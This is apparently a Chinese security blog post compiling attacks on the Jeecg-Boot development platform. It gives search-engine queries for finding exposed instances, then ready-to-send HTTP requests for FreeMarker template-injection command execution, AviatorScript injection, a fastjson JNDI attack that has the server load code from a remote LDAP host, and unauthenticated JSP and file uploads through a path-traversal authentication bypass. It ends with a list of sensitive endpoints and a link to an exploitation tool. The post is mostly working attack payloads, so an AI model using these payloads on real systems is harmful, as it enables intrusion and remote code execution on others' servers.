#  Jeecg-boot常见漏洞汇总（二）  
dmd5安全
                    dmd5安全  dmd5安全   2026-01-22 05:02  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njnobY7k6DrDZZrBthib7PfIFOibQju2ic5l7O6icFs5nSwfEdV8JV9Y5pib1Q/640?wx_fmt=png&from=appmsg "")  
  
  
资产测绘  
  
fofa:  
  
body="/sys/common/pdf/pdfPreviewIframe"  
  
title="Jeecg-Boot 快速开发平台" || body="积木报表"  
  
body="jeecg-boot"  
  
app="JEECG"  
  
icon_hash="1380908726"  
  
icon_hash="-250963920"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njng69hwWNPzSs6hYibAiaVyR5w8ulJQ27hMmfWXiatv9FkHrgOwb2zibHZYw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njngBdQLprWMCenBgW93rb9SZTwiajUpauz9OibMn9LPv2JGGvXxNbmVibNg/640?wx_fmt=png&from=appmsg "")  
  
  
JeecgBoot jmreport/loadTableData SSTI模板注入漏洞  
```
jeecg-boot 版本 3.5.3 中的 SSTI 注入漏洞允许远程攻击者通过对 /jmreport/loadTableData 组件进行精心设计的 HTTP 请求执行任意代码。

POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
X-Sign: AD0488642A880C68C8E3551C3BE0F6F5
X-TIMESTAMP: 1699726206096
X-Access-Token: null
token: null
JmReport-Tenant-Id: null
Content-Length: 167
Connection: close
Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726144; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1699726162
{"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"whoami\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
```  
  
  
JeecgBoot AviatorScript表达式注入  
```
积木报表软件存在AviatorScript代码注入RCE漏洞。使用接口/jmreport/save处在text中写入AviatorScript表达式。访问/jmreport/show触发AviatorScript解析从而导致命令执行。

POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 108
{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami \") }'" }
```  
  
  
jeecg-boot后台/sysMessageTemplate/sendMsg接口freemaker模板注入  
```
jeecg-boot的Freemarker模板注入导致远程命令执行, 远程攻击者可利用该漏洞调用在系统上执行任意命令。

1、添加一个测试模板
POST /jeecg-boot/sys/message/sysMessageTemplate/add HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 141
{"templateType":"1","templateCode":"5","templateName":"test111","templateContent":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}"}

2、发送模板
POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 64
{"templateCode":"5","testData":"{}","receiver":"","msgType":"1"}

3、执行模板并查看返回结果
GET /jeecg-boot/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10 HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao
Tenant-Id: 0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=0
Te: trailers
Connection: close
Accept-Encoding: gzip
```  
  
  
Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞  
```
JEECG 4.0 及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ../ 的 url 绕过鉴权。 
因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。
攻击者可对/api/../jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行。

POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
cmd: whoami
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET

创建如下远程文件，其内容为fastjson代码执行的payload
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://10.66.64.89:1389/8orsiq","autoCommit":true}}
```  
  
  
jeecg-boot/jmreport/upload接口存在未授权任意文件上传  
```
测试发现/jeecg-boot/jmreport/upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。

POST /jeecg-boot/jmreport/upload HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4
Cache-Control: no-cache
Pragma: no-cache
Host: 
Content-Length: 1476
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name="file"; filename="11111.txt"
Content-Type: text/html
<%! 1111>
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name="fileName"
11111.txt
------WebKitFormBoundaryyfyhSCMs9cajzFD4
Content-Disposition: form-data; name="biz"
excel_online
------WebKitFormBoundaryyfyhSCMs9cajzFD4--
```  
  
  
Jeecg-commonController.do文件上传  
```
由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ../ 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行。

POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
Content-Length: 360
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; "name="name"
zW9YCa.png
------WebKitFormBoundarygcflwtei
ontent-Disposition: form-data; name="documentTitle"
blank
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
Content-Type: image/png
11111
------WebKitFormBoundarygcflwtei--
```  
  
  
常见jeecg-boot常见接口  
```
/v2/api-docs
/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/
/jeecg-boot/sys/user/querySysUser?username=admin
/jeecg/
/api/sys/
/sys/user
/v2/api-docs
/swagger-ui.html
/env
/actuator
/mappings
/metrics
/beans
/configprops
/actuator/metrics
/actuator/mappings
/actuator/beans
/actuator/configprops
/actuator/httptrace
/druid/index.html
/druid/sql.html
/druid/weburi.html
/druid/websession.html
/druid/weburi.json
/druid/websession.json
/druid/login.html
/api/config/list
/sys/user/list
/sys/user/add
/sys/user/edit
/sys/user/queryById
/sys/user/changePassword
/sys/role/list
/sys/role/add
/sys/role/edit
/sys/role/queryPermission
/v2/api-docs
/v1/api-docs
/api-docs
/sys/menu/list
/sys/menu/add
/sys/menu/edit
/sys/menu/delete
/sys/depart/list
/sys/depart/add
/sys/depart/edit
/sys/depart/delete
/online/cgform/list
/online/cgform/add
/online/cgform/edit
/online/cgform/delete
/online/cgform/fields/{tableName}
/online/cgform/table/list
/online/cgform/table/sync
/online/cgform/generateCode
/sys/dict/list
/sys/dict/add
/sys/dict/edit
/sys/dict/delete
/act/process/list
/act/process/deploy
/act/task/list
/act/task/complete
/act/task/history
/sys/common/upload
/sys/common/download/{fileId}
/sys/common/view/{fileId}
/monitor/redis/info
/monitor/server/info
/api/test/demo/list
/api/test/demo/add
/sys/log/list
/sys/log/delete
/sys/sms/send
/sys/sms/list
/api/test/demo/edit
/api/test/demo/delete
/report/loadReport/{code}
/chart/api/getChartData
/api/test/demo/queryById
/act/process/delete
/sys/dict/loadDictItems/{dictCode}
/jeecg-boot/sys/getLoginQrcode
/jeecg-boot/sys/getQrcodeToken
/jeecg-boot/sys/login
/jeecg-boot/sys/phoneLogin
/jeecg-boot/sys/scanLoginQrcode
/jeecg-boot/drag/onlDragDataSource/add
/jeecg-boot/drag/onlDragDataSource/delete
/jeecg-boot/drag/onlDragDataSource/deleteBatch
/jeecg-boot/drag/onlDragDataSource/edit
/jeecg-boot/drag/onlDragDataSource/list
/jeecg-boot/drag/onlDragDataSource/queryById
/jeecg-boot/drag/onlDragDatasetHead/add
/jeecg-boot/drag/onlDragDatasetHead/addGroup
/jeecg-boot/drag/onlDragDatasetHead/delDragDataSetHeadGroup
/jeecg-boot/drag/onlDragDatasetHead/delete
/jeecg-boot/drag/onlDragDatasetHead/edit
/jeecg-boot/drag/onlDragDatasetHead/queryById
/jeecg-boot/drag/onlDragDatasetHead/updateGroup
/jeecg-boot/drag/onlDragDatasetParam/add
/jeecg-boot/drag/onlDragDatasetParam/delete
/jeecg-boot/druid/login.html
/jeecg-boot/drag/onlDragDatasetParam/deleteBatch
/jeecg-boot/drag/onlDragDatasetParam/edit
/jeecg-boot/actuator/httptrace
/jeecg-boot/drag/onlDragDatasetParam/list
/jeecg-boot/drag/onlDragDatasetParam/queryById
/jeecg-boot/drag/websocket/sendData
/jeecg-boot/sys/checkRule/add
/jeecg-boot/sys/checkRule/checkByCode
/jeecg-boot/sys/checkRule/delete
/jeecg-boot/sys/checkRule/deleteBatch
/jeecg-boot/sys/checkRule/edit
/jeecg-boot/sys/checkRule/list
/jeecg-boot/sys/checkRule/queryById
/jeecg-boot/sys/comment/add
/jeecg-boot/sys/comment/addFile
/jeecg-boot/sys/comment/addText
/jeecg-boot/sys/comment/delete
/jeecg-boot/sys/comment/deleteBatch
/jeecg-boot/sys/comment/deleteOne
/jeecg-boot/sys/comment/edit
/jeecg-boot/sys/comment/fileList
/jeecg-boot/sys/comment/list
/jeecg-boot/sys/comment/listByForm
/jeecg-boot/sys/comment/queryById
/jeecg-boot/sys/dataSource/add
/jeecg-boot/sys/dataSource/delete
/jeecg-boot/sys/dataSource/deleteBatch
/jeecg-boot/sys/dataSource/edit
/jeecg-boot/sys/dataSource/list
/jeecg-boot/sys/dataSource/queryById
/jeecg-boot/sys/dictItem/dictItemCheck
/jeecg-boot/sys/duplicate/check
/jeecg-boot/sys/files/add
/jeecg-boot/sys/files/delete
/jeecg-boot/sys/files/deleteBatch
/jeecg-boot/sys/files/edit
/jeecg-boot/sys/files/list
/jeecg-boot/sys/files/queryById
/jeecg-boot/sys/fillRule/add
/jeecg-boot/sys/fillRule/delete
/jeecg-boot/sys/fillRule/deleteBatch
/jeecg-boot/sys/fillRule/edit
/jeecg-boot/sys/fillRule/list
/jeecg-boot/sys/fillRule/queryById
/jeecg-boot/sys/formFile/add
/jeecg-boot/sys/formFile/delete
/jeecg-boot/sys/formFile/deleteBatch
/jeecg-boot/sys/formFile/edit
/jeecg-boot/sys/formFile/list
/jeecg-boot/sys/formFile/queryById
/jeecg-boot/sys/position/add
/jeecg-boot/sys/position/delete
/jeecg-boot/sys/position/deleteBatch
/jeecg-boot/sys/position/edit
/jeecg-boot/sys/position/list
/jeecg-boot/sys/position/queryByCode
/jeecg-boot/sys/position/queryById
/jeecg-boot/sys/quartzJob/pause
/jeecg-boot/sys/quartzJob/resume
/jeecg-boot/sys/randomImage/
/jeecg-boot/sys/sysDepartPermission/add
/jeecg-boot/sys/sysDepartPermission/delete
/jeecg-boot/sys/sysDepartPermission/deleteBatch
/jeecg-boot/sys/sysDepartPermission/edit
/jeecg-boot/sys/sysDepartPermission/list
/jeecg-boot/sys/sysDepartPermission/queryById
/jeecg-boot/sys/sysDepartRole/add
/jeecg-boot/sys/sysDepartRole/delete
/jeecg-boot/sys/sysDepartRole/deleteBatch
/jeecg-boot/sys/sysDepartRole/edit
/jeecg-boot/sys/sysDepartRole/list
/jeecg-boot/sys/sysDepartRole/queryById
/jeecg-boot/sys/sysRoleIndex/add
/jeecg-boot/sys/sysRoleIndex/delete
/jeecg-boot/sys/sysRoleIndex/deleteBatch
/jeecg-boot/sys/sysRoleIndex/edit
/jeecg-boot/sys/sysRoleIndex/list
/jeecg-boot/sys/sysRoleIndex/queryByCode
/jeecg-boot/sys/sysRoleIndex/queryById
/jeecg-boot/test/dynamic/test1
/jeecg-boot/test/jeecgDemo/add
/jeecg-boot/test/jeecgDemo/delete
/jeecg-boot/test/jeecgDemo/deleteBatch
/jeecg-boot/test/jeecgDemo/edit
/jeecg-boot/test/jeecgDemo/list
/jeecg-boot/test/jeecgDemo/queryById
/sys/user/delete
/jeecg-boot/sys/user/addSysUserRole
/sys/role/delete
/user/register
```  
  
  
常见jeecg-boot漏洞利用工具  
```
https://github.com/Framework-vulnerability-tool/jeecg

工具介绍
jeecg综合漏洞利用工具,程序采用javafx开发,环境JDK 1.8 声明：仅用于授权测试，用户滥用造成的一切后果和作者无关 请遵守法律法规！ 漏洞收录如下：

jeecg-boot queryFieldBySql远程命令执行漏洞
jeecg-boot testConnection远程命令执行漏洞
JeecgBoot jmreport/loadTableData SSTI模板注入漏洞
jeecg-boot-queryTableData-sqli注入漏洞
jeecg-boot-getDictItemsByTable-sqli注入漏洞
Jeecg-Boot qurestSql-SQL注入漏洞
jeecg-boot commonController 任意文件上传漏洞
jeecg-boot jmreport任意文件上传漏洞
jeecg-boot-querySysUser信息泄露漏洞
jeecg-boot-checkOnlyUser信息泄露漏洞
jeecg-boot-httptrace信息泄露漏洞
jeecg-boot-任意文件下载漏洞
jeecg-boot-jeecgFormDemoController漏洞
jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞
jeecg-boot-v2 sys/duplicate/check注入漏洞
jeecg-boot-v2 AviatorScript表达式注入漏洞
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZQgABwTC9I5Kg25tLXicUkdj4gY1I2njnqqz73EeCq9bg1uteW7iadUnNO98xDrib2Dlxnnh9faxqACUZSAnjDROw/640?wx_fmt=png&from=appmsg "")  
  
